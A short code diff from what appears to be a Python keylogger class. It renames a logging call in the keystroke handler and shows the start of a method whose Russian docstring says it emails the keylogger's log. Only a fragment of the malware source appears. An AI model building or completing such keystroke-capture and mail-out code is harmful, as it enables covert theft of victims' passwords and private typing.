@@ -26,7 +26,7 @@ class KeyLogger:
                 current_key = " "
             else:
                 current_key = " " + str(key) + " "
-        self.add_log(current_key)
+        self.append_to_log(current_key)
 
     def send_keylogger(self):
         """ Отправка кейлоггера на почту """
